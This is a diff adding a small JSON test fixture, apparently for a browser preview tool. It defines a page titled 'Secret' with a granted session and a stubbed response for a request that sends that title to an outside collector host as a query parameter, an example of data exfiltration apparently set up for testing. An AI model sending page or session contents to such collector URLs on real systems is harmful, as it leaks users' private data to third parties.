@@ -1,0 +1,2 @@
+{"mode": "preview", "grantSession": true, "page": {"url": "https://app.example.com/a", "title": "Secret"},
+ "responses": {"https://collector.example.org/?d=Secret": {"body": ""}}}
